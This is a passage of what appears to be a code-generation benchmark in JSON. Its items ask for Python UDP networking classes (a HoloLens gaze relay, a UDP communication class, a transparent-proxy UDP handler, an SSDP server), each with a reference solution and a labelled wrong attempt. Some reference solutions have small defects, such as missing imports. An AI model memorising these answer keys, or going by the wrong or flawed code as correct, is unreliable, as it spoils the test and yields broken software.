    "Canonical_solution": "import socket\nimport zmq\nimport zmq_tools\nfrom pyre import zhelper\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = zhelper.zthread_fork(self.context, self.thread_loop)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.start_server(f\"{host}:{port}\")\n\n    def start_server(self, new_address):\n        self.thread_pipe.send_string(\"Bind\", flags=zmq.SNDMORE)\n        self.thread_pipe.send_string(new_address)\n        response = self.thread_pipe.recv_string()\n        msg = self.thread_pipe.recv_string()\n        if response == \"Bind OK\":\n            host, port = msg.split(\":\")\n            self.host = host\n            self.port = port\n            return True\n        return False\n\n    def stop_server(self):\n        self.thread_pipe.send_string(\"Exit\")\n        while self.thread_pipe:\n            pass\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        ipc_pub = zmq_tools.Msg_Dispatcher(context, self.ipc_push_url)\n        ipc_sub = zmq_tools.Msg_Receiver(\n            context,\n            self.ipc_sub_url,\n            (\"gaze\", \"notify.calibration.failed\", \"notify.calibration.successful\"),\n        )\n        poller.register(pipe, zmq.POLLIN)\n        poller.register(ipc_sub.socket, zmq.POLLIN)\n        remote_socket = None\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n        while True:\n            items = [sock for sock, _ in poller.poll()]\n            if pipe in items:\n                cmd = pipe.recv_string()\n                if cmd == \"Exit\":\n                    break\n                elif cmd == \"Bind\":\n                    new_url = pipe.recv_string()\n                    if remote_socket:\n                        poller.unregister(remote_socket)\n                        remote_socket.close()\n                    try:\n                        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                        remote_socket.setblocking(False)\n                        addr, port = new_url.split(\":\")\n                        socket_addr = (addr, int(port))\n                        remote_socket.bind(socket_addr)\n                    except OSError:\n                        remote_socket = None\n                        pipe.send_string(\"Error\", flags=zmq.SNDMORE)\n                        pipe.send_string(f\"Could not bind to Socket: {new_url}\")\n                    else:\n                        pipe.send_string(\"Bind OK\", flags=zmq.SNDMORE)\n                        pipe.send_string(new_url)\n                        poller.register(remote_socket, zmq.POLLIN)\n\n            if remote_socket and remote_socket.fileno() in items:\n                self.on_recv(remote_socket, ipc_pub)\n\n            if ipc_sub.socket in items:\n                while ipc_sub.new_data:\n                    topic, payload = ipc_sub.recv()\n                    if self.gaze_receiver and remote_socket and topic.startswith(\"gaze\"):\n                        method, eye = payload[\"topic\"].split(\".\")[1:3]\n                        if method == \"2d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"ff\", *payload[\"norm_pos\"]),\n                            )\n                        elif method == \"3d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"fff\", *payload[\"gaze_point_3d\"]),\n                            )\n                        remote_socket.sendto(data, self.gaze_receiver)\n\n                    elif (self.calib_result_receiver and remote_socket and \n                          topic.startswith(\"notify.calibration.\")):\n                        if payload[\"subject\"] == \"calibration.successful\":\n                            remote_socket.sendto(b\"ECS\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n                        elif payload[\"subject\"] == \"calibration.failed\":\n                            remote_socket.sendto(b\"ECF\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n\n        if remote_socket:\n            remote_socket.close()\n\n    def on_recv(self, socket, ipc_pub):\n        try:\n            byte_msg, sender = socket.recvfrom(2048)\n        except OSError:\n            return\n\n        if byte_msg[:1] == b\"R\":\n            try:\n                ipc_pub.socket.send_string(\"notify.calibration.add_ref_data\", flags=zmq.SNDMORE)\n                ipc_pub.socket.send(byte_msg[1:])\n                response = b\"0R\"\n            except Exception as e:\n                response = b\"FRReference point mal-formatted or missing: %s\" % str(e).encode()\n        elif byte_msg[:1] == b\"S\":\n            self.gaze_receiver = sender\n            response = b\"0S\"\n        elif byte_msg[:1] == b\"s\":\n            self.gaze_receiver = None\n            response = b\"0s\"\n        elif byte_msg[:1] == b\"I\":\n            mode = byte_msg[1:2]\n            init_2d = mode == b\"2\"\n            calib_method = \"HMD_Calibration\" if init_2d else \"HMD_Calibration_3D\"\n            ipc_pub.notify({\"subject\": \"start_plugin\", \"name\": calib_method})\n            response = b\"0I\"\n        elif byte_msg[:1] == b\"i\":\n            response = b\"0i\"\n        elif byte_msg[:1] == b\"C\":\n            self.calib_result_receiver = sender\n            response = b\"0C\"\n        elif byte_msg[:1] == b\"c\":\n            response = b\"0c\"\n        elif byte_msg[:1] == b\"T\":\n            try:\n                target = struct.unpack(\"f\", byte_msg[1:])[0]\n                response = b\"0T\"\n            except Exception:\n                response = b\"FT'%s' cannot be converted to float.\" % (byte_msg[1])\n        elif byte_msg[:1] == b\"V\":\n            response = b\"0V%s\" % bytes(__version__)\n        else:\n            response = b'FFUnknown command. \"%s\"' % byte_msg\n\n        socket.sendto(response, sender)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nimport zmq\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = self.context.socket(zmq.PAIR)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n    def start_server(self, new_address):\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            self.sock.bind((new_address[0], int(new_address[1])))\n            self.pipe = self.context.socket(zmq.PAIR)\n            self.pipe.bind(\"inproc://hololens_relay_pipe\")\n            self.thread_pipe.connect(\"inproc://hololens_relay_pipe\")\n            thread = threading.Thread(target=self.thread_loop, args=(self.context, self.pipe))\n            thread.start()\n            return True\n        except Exception as e:\n            print(f\"Failed to start server: {e}\")\n            return False\n\n    def stop_server(self):\n        if hasattr(self, 'sock'):\n            self.sock.close()\n        if hasattr(self, 'thread_pipe'):\n            self.thread_pipe.close()\n        if hasattr(self, 'pipe'):\n            self.pipe.close()\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        poller.register(pipe, zmq.POLLIN)\n\n        while True:\n            socks = dict(poller.poll(100))\n            if socks.get(pipe) == zmq.POLLIN:\n                msg = pipe.recv()\n                if msg == b'END':\n                    break\n\n    def on_recv(self, socket, ipc_pub):\n        data, addr = socket.recvfrom(65535)\n        message_type = data[:4].decode('utf-8').strip()\n        if message_type == \"GAZE\":\n            self.gaze_receiver = addr\n            ipc_pub.send_multipart([b\"gaze_data\", data])\n        elif message_type == \"CALI\":\n            self.calib_result_receiver = addr\n            ipc_pub.send_multipart([b\"calibration_result\", data])\n```"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Implement a UDP communication class that handles socket creation, data transmission, and reception with proper connection management and error handling.\n\nClass Description: The UDPCommunication class provides functionality for UDP-based network communication, including opening/closing connections, sending/receiving data, and managing connection status. It uses threading for asynchronous data reception and includes signal-based notification for connection status changes.\n\nAttributes:\n- conn: [socket.socket] - The UDP socket object used for communication\n- status: [ConnectionStatus] - Current connection status (CONNECTED/CLOSED)\n- config: [dict] - Configuration dictionary containing protocol, port, and target information\n- onConnectionStatus: [pyqtSignal] - Signal emitted when connection status changes\n- hintSignal: [pyqtSignal] - Signal for displaying error messages or hints\n- receiveProcess: [threading.Thread] - Thread handling incoming data reception\n\nMethods:\n- __init__() -> None - Initializes the UDP communication object with default configuration\n- openCloseSerial() -> None - Toggles connection state (opens if closed, closes if open)\n- receiveDataProcess(conn: socket.socket) -> None - Thread function for receiving data (private method)\n- send(data: bytes) -> None - Sends data to configured target\n- checkTarget(target: str) -> tuple - Validates and parses target address into (host, port) tuple\n- isConnected() -> bool - Returns current connection status\n- getConnStatus() -> ConnectionStatus - Returns current connection status object",
    "Canonical_solution": "from PyQt5.QtCore import pyqtSignal, QObject\nimport socket\nimport threading\nimport time\nimport re\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            \"protocol\": \"udp\",\n            \"port\": 2345,\n            \"target\": [\"127.0.0.1:2345\", [\"127.0.0.1:2345\"]]\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus, str)\n        self.hintSignal = pyqtSignal(str, str, str)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(type=socket.SOCK_DGRAM)\n                self.conn.bind((\"0.0.0.0\", self.config[\"port\"]))\n                self.status = ConnectionStatus.CONNECTED\n                self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                self.receiveProcess.setDaemon(True)\n                self.receiveProcess.start()\n                self.onConnectionStatus.emit(self.status, \"\")\n            except Exception as e:\n                msg = _(\"Connect Failed\") + \"\\n\" + str(e)\n                self.hintSignal.emit(\"error\", _(\"Error\"), msg)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, msg)\n        else:\n            self.status = ConnectionStatus.CLOSED\n            if self.conn:\n                self.conn.close()\n                self.conn = None\n            self.onConnectionStatus.emit(self.status, \"\")\n\n    def receiveDataProcess(self, conn):\n        buffer = b''\n        t = 0\n        conn.settimeout(0.1)\n        while self.status != ConnectionStatus.CLOSED:\n            try:\n                data, target = conn.recvfrom(4096)\n                if data:\n                    if len(data) > 4096:\n                        flush = False\n                    t = time.time()\n                    buffer += data\n                    if buffer and (time.time() - t > 0.001):\n                        try:\n                            if buffer:\n                                self.onReceived(buffer)\n                        except Exception as e:\n                            print(\"-- error in onReceived callback:\", e)\n                        buffer = b''\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(\"-- recv error:\", e)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, _(\"Connection closed!\") + \" \" + str(e))\n                try:\n                    conn.close()\n                except Exception:\n                    pass\n                break\n\n    def send(self, data: bytes):\n        if self.conn and self.status == ConnectionStatus.CONNECTED:\n            target = self.checkTarget(self.config[\"target\"][0])\n            if not target:\n                self.hintSignal.emit(\"error\", _(\"Target error\"), _(\"Target error\") + \": \" + self.config[\"target\"])\n            self.conn.sendto(data, target)\n\n    def checkTarget(self, target):\n        if not target:\n            return None\n        host = target\n        port = 80\n        target = target.replace(\"\uff1a\", \":\")\n        if target.endswith(\":\"):\n            target = target[:-1]\n        _host = re.match('http(.*)://(.*)', target)\n        if _host:\n            s, target = _host.groups()\n            host = target\n        _host = re.match('(.*):(\\d*)', target)\n        if _host:\n            host, port = _host.groups()\n            port = int(port)\n        if host.endswith(\"/\"):\n            host = host[:-1]\n        return (host, port)\n\n    def isConnected(self):\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self):\n        return self.status",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom enum import Enum\nfrom PyQt5.QtCore import pyqtSignal\n\n\nclass ConnectionStatus(Enum):\n    CONNECTED = 1\n    CLOSED = 0\n\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            'protocol': 'UDP',\n            'port': 5000,\n            'target': ''\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus)\n        self.hintSignal = pyqtSignal(str)\n        self.receiveProcess = None\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                self.conn.settimeout(1)\n                host, port = self.checkTarget(self.config['target'])\n                self.conn.bind((host, port))\n                self.status = ConnectionStatus.CONNECTED\n                self.onConnectionStatus.emit(ConnectionStatus.CONNECTED)\n                self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                self.receiveProcess.start()\n            except Exception as e:\n                self.hintSignal.emit(f\"Failed to connect: {e}\")\n        else:\n            try:\n                self.conn.close()\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(ConnectionStatus.CLOSED)\n                if self.receiveProcess and self.receiveProcess.is_alive():\n                    self.receiveProcess.join()\n            except Exception as e:\n                self.hintSignal.emit(f\"Error closing connection: {e}\")\n\n    def receiveDataProcess(self, conn):\n        while self.status == ConnectionStatus.CONNECTED:\n            try:\n                data, addr = conn.recvfrom(65535)\n                print(f\"Received from {addr}: {data.decode()}\")\n            except socket.timeout:\n                continue\n            except Exception as e:\n                self.hintSignal.emit(f\"Receive error: {e}\")\n                break\n\n    def send(self, data: bytes):\n        if self.status != ConnectionStatus.CONNECTED:\n            self.hintSignal.emit(\"Not connected\")\n            return\n        try:\n            host, port = self.checkTarget(self.config['target'])\n            self.conn.sendto(data, (host, port))\n        except Exception as e:\n            self.hintSignal.emit(f\"Send error: {e}\")\n\n    def checkTarget(self, target: str) -> tuple:\n        if not target:\n            raise ValueError(\"Target address is empty\")\n        if ':' not in target:\n            raise ValueError(\"Invalid target format. Expected 'host:port'\")\n        host, port_str = target.split(':', 1)\n        try:\n            port = int(port_str)\n            if not (0 <= port <= 65535):\n                raise ValueError(\"Port out of range\")\n        except ValueError:\n            raise ValueError(\"Invalid port number\")\n        return host, port\n\n    def isConnected(self) -> bool:\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self) -> ConnectionStatus:\n        return self.status\n```"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with advanced features like receiving destination address information and binding to any available interface.\n\nClass Description: The UDPSocketHandler class provides methods for setting up UDP listeners, receiving UDP packets with ancillary data (including destination address), and sending UDP packets with specific source binding. It's designed for scenarios where you need detailed control over UDP communication, such as when implementing network proxies or specialized UDP services.\n\nAttributes:\n[Note: The reference implementation doesn't show any instance attributes, but uses class-level constants]\nIP_BINDANY: [int] - Socket option constant for binding to any available interface\nIP_RECVDSTADDR: [int] - Socket option constant for receiving destination address information\n\nMethods:\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP data along with source and destination address information\n  Parameters:\n    - listener: The UDP socket to receive data from\n    - bufsize: Maximum amount of data to receive\n  Returns:\n    - tuple: (srcip, dstip, data) where:\n      srcip: Source address (IP, port)\n      dstip: Destination address (IP, port) or None\n      data: Received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP data with specific source binding\n  Parameters:\n    - sock: The original socket (used for family information)\n    - srcip: Source address (IP, port) to bind to\n    - dstip: Destination address (IP, port) to send to\n    - data: Data to send\n  Returns: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures a UDP listener socket to receive destination address information\n  Parameters:\n    - udp_listener: An object containing v4 and/or v6 socket instances\n  Returns: None",
    "Canonical_solution": "import socket\nimport subprocess as ssubprocess\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_BINDANY = 24\nIP_RECVDSTADDR = 7\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(4096,\n                                                  socket.CMSG_SPACE(4))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n                port = 53\n                ip = socket.inet_ntop(socket.AF_INET, cmsg_data[0:4])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n               \"-- ignored UDP to %r: \"\n               \"couldn't determine source IP address\" % (dstip,))\n            return\n\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport struct\n\nIP_BINDANY = 40\nIP_RECVDSTADDR = 34\n\ndef setup_udp_listener(udp_listener):\n    for attr in dir(udp_listener):\n        if attr.startswith('v') and attr[1:].isdigit():\n            sock = getattr(udp_listener, attr)\n            if sock is not None:\n                sock.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n                sock.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)\n\ndef recv_udp(listener, bufsize):\n    data, srcip = listener.recvfrom(bufsize + 256)\n    dstip = None\n    cmsg_data = listener.cmsg_data()\n    for cmsg_level, cmsg_type, cmsg_value in cmsg_data:\n        if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n            ip = socket.inet_ntop(socket.AF_INET, cmsg_value[:4])\n            port = struct.unpack('!H', cmsg_value[4:6])[0]\n            dstip = (ip, port)\n    return (srcip, dstip, data)\n\ndef send_udp(sock, srcip, dstip, data):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as temp_sock:\n        temp_sock.bind(srcip)\n        temp_sock.connect(dstip)\n        temp_sock.send(data)\n```"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Implement a Simple Service Discovery Protocol (SSDP) server using UDP multicast communication to handle device discovery and announcement in a network.\n\nClass Description: The SSDPServer class implements an SSDP server that listens for M-SEARCH requests and responds with device information. It supports device registration, unregistration, and sending byebye notifications when shutting down.\n\nAttributes:\n- ip_list: [list] - List of tuples containing local IP addresses and their subnet masks\n- sock_list: [list] - List of socket objects for each IP address\n- sock: [socket.socket] - Main UDP socket for communication\n- running: [bool] - Flag indicating if the server is running\n- ssdp_thread: [threading.Thread] - Thread running the server's main loop\n- sending_byebye: [bool] - Flag controlling whether to send byebye notifications\n- known: [dict] - Dictionary of registered services with their USN as keys\n\nMethods:\n- __init__() -> None - Initializes the SSDP server with default values\n- start() -> None - Starts the SSDP server thread\n- stop(byebye: bool) -> None - Stops the SSDP server thread, with option to send byebye notifications\n- run() -> None - Main server loop that handles incoming requests\n- datagram_received(data: bytes, host_port: tuple) -> None - Processes incoming UDP datagrams\n- discovery_request(headers: dict, host_port: tuple) -> None - Handles M-SEARCH discovery requests\n- get_subnet_ip(ip: str, mask: str) -> list - Calculates subnet IP address\n- shutdown() -> None - Cleans up resources and sends byebye notifications\n- register(usn: str, st: str, location: str, server: str, cache_control: str) -> None - Registers a new service\n- unregister(usn: str) -> None - Unregisters a service\n- do_byebye(usn: str) -> None - Sends byebye notification for a service\n- send_it(response: str, destination: tuple) -> None - Sends a response to the specified destination",
    "Canonical_solution": "import sys\nimport random\nimport socket\nimport logging\nimport threading\nfrom email.utils import formatdate\n\nSSDP_PORT = 1900\nSSDP_ADDR = '239.255.255.250'\nSERVER_ID = 'SSDP Server'\n\nclass SSDPServer:\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.sock = None\n        self.running = False\n        self.ssdp_thread = None\n        self.sending_byebye = True\n        self.known = {}\n\n    def start(self):\n        if not self.running:\n            self.running = True\n            self.sending_byebye = True\n            self.ssdp_thread = threading.Thread(target=self.run, name=\"SSDP_THREAD\")\n            self.ssdp_thread.start()\n\n    def stop(self, byebye=True):\n        if self.running:\n            self.running = False\n            try:\n                socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'', (SSDP_ADDR, SSDP_PORT))\n            except Exception:\n                pass\n            self.sending_byebye = byebye\n            if self.ssdp_thread is not None:\n                self.ssdp_thread.join()\n\n    def run(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)\n\n        if sys.platform == 'win32':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        elif sys.platform == 'darwin':\n            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        elif hasattr(socket, \"SO_REUSEPORT\"):\n            try:\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n            except socket.error:\n                try:\n                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                except socket.error:\n                    pass\n\n        self.ip_list = [('192.168.137.1', '255.255.255.0')] if sys.platform == 'win32' else []\n        self.sock_list = []\n        for ip, mask in self.ip_list:\n            try:\n                mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n                self.sock_list.append(Sock(ip))\n            except Exception:\n                pass\n\n        try:\n            self.sock.bind(('0.0.0.0', SSDP_PORT))\n        except Exception:\n            return\n        self.sock.settimeout(1)\n\n        while self.running:\n            try:\n                data, addr = self.sock.recvfrom(1024)\n                self.datagram_received(data, addr)\n            except socket.timeout:\n                continue\n\n        self.shutdown()\n        for ip, mask in self.ip_list:\n            mreq = socket.inet_aton(SSDP_ADDR) + socket.inet_aton(ip)\n            try:\n                self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP, mreq)\n            except Exception:\n                continue\n        self.sock.close()\n        self.sock = None\n\n    def datagram_received(self, data, host_port):\n        try:\n            header = data.decode().split('\\r\\n\\r\\n')[0]\n        except ValueError:\n            return\n        if len(header) == 0:\n            return\n\n        lines = header.split('\\r\\n')\n        cmd = lines[0].split(' ')\n        lines = map(lambda x: x.replace(': ', ':', 1), lines[1:])\n        lines = filter(lambda x: len(x) > 0, lines)\n        headers = dict(map(lambda x: (x[0].lower(), x[1]), [x.split(':', 1) for x in lines]))\n\n        if cmd[0] == 'M-SEARCH' and cmd[1] == '*':\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        (host, port) = host_port\n        for i in self.known.values():\n            if i['ST'] == headers['st'] or headers['st'] == 'ssdp:all':\n                response = ['HTTP/1.1 200 OK']\n                usn = None\n                for k, v in i.items():\n                    if k == 'USN':\n                        usn = v\n                    response.append('%s: %s' % (k, v))\n\n                if usn:\n                    response.append('DATE: %s' % formatdate(timeval=None, localtime=False, usegmt=True))\n                    response.extend(('', ''))\n                    destination = (host, port)\n                    for ip, mask in self.ip_list:\n                        if self.get_subnet_ip(ip, mask) == self.get_subnet_ip(host, mask):\n                            self.sock.sendto('\\r\\n'.join(response).format(ip).encode(), destination)\n                            break\n\n    def get_subnet_ip(self, ip, mask):\n        a = [int(n) for n in mask.split('.')]\n        b = [int(n) for n in ip.split('.')]\n        return [a[i] & b[i] for i in range(4)]\n\n    def shutdown(self):\n        for st in self.known:\n            self.do_byebye(st)\n        usn = [st for st in self.known]\n        for st in usn:\n            self.unregister(st)\n\n    def register(self, usn, st, location, server=SERVER_ID, cache_control='max-age=1800'):\n        self.known[usn] = {\n            'USN': usn,\n            'LOCATION': location,\n            'ST': st,\n            'EXT': '',\n            'SERVER': server,\n            'CACHE-CONTROL': cache_control\n        }\n\n    def unregister(self, usn):\n        del self.known[usn]\n\n    def do_byebye(self, usn):\n        if not self.sending_byebye:\n            return\n\n        resp = [\n            'NOTIFY * HTTP/1.1',\n            'HOST: %s:%d' % (SSDP_ADDR, SSDP_PORT),\n            'NTS: ssdp:byebye',\n        ]\n        try:\n            stcpy = dict(self.known[usn].items())\n            stcpy['NT'] = stcpy['ST']\n            del stcpy['ST']\n            resp.extend(map(lambda x: ': '.join(x), stcpy.items()))\n            resp.extend(('', ''))\n            if self.sock:\n                try:\n                    self.send_it('\\r\\n'.join(resp), (SSDP_ADDR, SSDP_PORT))\n                except (AttributeError, socket.error):\n                    pass\n        except KeyError:\n            pass\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.send_it(response, destination)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "```python\nimport socket\nimport threading\nimport struct\nfrom ipaddress import IPv4Network\n\n\nclass SSDPServer:\n    SSDP_ADDR = \"239.255.255.250\"\n    SSDP_PORT = 1900\n    SSDP_MCAST_GRP = (SSDP_ADDR, SSDP_PORT)\n    SSDP_IP_HDR = \"Man: \\\"ssdp:discover\\\"\\r\\n\"\n\n    def __init__(self):\n        self.ip_list = []\n        self.sock_list = []\n        self.running = False\n        self.sending_byebye = True\n        self.known = {}\n        self.ssdp_thread = None\n\n    def start(self):\n        if self.running:\n            return\n        self.running = True\n        self._setup_sockets()\n        self.ssdp_thread = threading.Thread(target=self.run)\n        self.ssdp_thread.start()\n\n    def stop(self, byebye=True):\n        self.sending_byebye = byebye\n        self.running = False\n        for sock in self.sock_list:\n            sock.close()\n        self.ssdp_thread.join()\n\n    def _setup_sockets(self):\n        interfaces = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET, socket.SOCK_DGRAM)\n        for _, _, _, _, addr in interfaces:\n            ip = addr[0]\n            mask = self._get_subnet_mask(ip)\n            subnet_ip = self.get_subnet_ip(ip, mask)\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.settimeout(0.5)\n            sock.bind((ip, 0))\n            mreq = struct.pack(\"4sl\", socket.inet_aton(self.SSDP_ADDR), socket.INADDR_ANY)\n            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\n            self.sock_list.append(sock)\n            self.ip_list.append((ip, mask))\n\n    def _get_subnet_mask(self, ip):\n        try:\n            with open(\"/proc/net/route\") as f:\n                for line in f:\n                    parts = line.strip().split()\n                    if len(parts) < 3:\n                        continue\n                    if parts[0] == socket.gethostname():\n                        mask = parts[2]\n                        mask = socket.inet_ntoa(struct.pack(\"<L\", int(mask, 16)))\n                        return mask\n        except Exception:\n            return \"255.255.255.0\"\n        return \"255.255.255.0\"\n\n    def get_subnet_ip(self, ip, mask):\n        network = IPv4Network(f\"{ip}/{mask}\", strict=False)\n        return str(network.network_address)\n\n    def run(self):\n        while self.running:\n            for sock in self.sock_list:\n                try:\n                    data, host_port = sock.recvfrom(65507)\n                    headers = dict(h.split(\": \", 1) for h in data.decode().strip().split(\"\\r\\n\")[1:])\n                    self.datagram_received(data, host_port, headers)\n                except socket.timeout:\n                    pass\n\n    def datagram_received(self, data, host_port, headers):\n        if \"M-SEARCH\" in data.decode():\n            self.discovery_request(headers, host_port)\n\n    def discovery_request(self, headers, host_port):\n        st = headers.get(\"ST\")\n        mx = int(headers.get(\"MX\", 1))\n        if st in [\"ssdp:all\", *self.known.values()]:\n            for usn, info in self.known.items():\n                if st != \"ssdp:all\" and info[\"st\"] != st:\n                    continue\n                response = (\n                    f\"HTTP/1.1 200 OK\\r\\n\"\n                    f\"Location: {info['location']}\\r\\n\"\n                    f\"ST: {info['st']}\\r\\n\"\n                    f\"USN: {usn}\\r\\n\"\n                    f\"Server: {info['server']}\\r\\n\"\n                    f\"Cache-Control: {info['cache_control']}\\r\\n\"\n                    f\"Date: {self._get_date()}\\r\\n\"\n                    \"\\r\\n\"\n                )\n                for sock in self.sock_list:\n                    sock.sendto(response.encode(), host_port)\n\n    def _get_date(self):\n        from email.utils import formatdate\n        return formatdate(usegmt=True)\n\n    def register(self, usn, st, location, server, cache_control=\"max-age=1800\"):\n        self.known[usn] = {\n            \"st\": st,\n            \"location\": location,\n            \"server\": server,\n            \"cache_control\": cache_control,\n        }\n\n    def unregister(self, usn):\n        if usn in self.known:\n            del self.known[usn]\n\n    def do_byebye(self, usn):\n        if usn not in self.known:\n            return\n        info = self.known[usn]\n        response = (\n            f\"NOTIFY * HTTP/1.1\\r\\n\"\n            f\"HOST: {self.SSDP_MCAST_GRP[0]}:{self.SSDP_MCAST_GRP[1]}\\r\\n\"\n            f\"NT: {info['st']}\\r\\n\"\n            f\"NTS: ssdp:byebye\\r\\n\"\n            f\"USN: {usn}\\r\\n\"\n            f\"SERVER: {info['server']}\\r\\n\"\n            f\"CACHE-CONTROL: max-age=0\\r\\n\"\n            f\"DATE: {self._get_date()}\\r\\n\"\n            \"\\r\\n\"\n        )\n        for sock in self.sock_list:\n            sock.sendto(response.encode(), self.SSDP_MCAST_GRP)\n\n    def send_it(self, response, destination):\n        for sock in self.sock_list:\n            sock.sendto(response.encode(), destination)\n\n    def shutdown(self):\n        for usn in list(self.known.keys()):\n            self.do_byebye(usn)\n        self.stop(byebye=True)\n```"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with support for IP transparent proxying and original destination address retrieval.\n\nClass Description: The UDPSocketHandler class provides methods for receiving and sending UDP packets while maintaining information about both source and destination addresses. It supports both IPv4 and IPv6 protocols and includes special handling for transparent proxying scenarios.\n\nAttributes:\n[No explicit attributes are defined in the class, as it primarily operates through its methods]\n\nMethods:\n\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP packets and extracts both source and destination address information. Uses recvmsg() to get ancillary data containing the original destination address.\n  Input:\n    - listener: A bound UDP socket object\n    - bufsize: Maximum buffer size for received data\n  Output:\n    - tuple: (srcip: tuple, dstip: tuple, data: bytes) containing source address, destination address, and received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP packets while maintaining source address information through IP transparent option.\n  Input:\n    - sock: 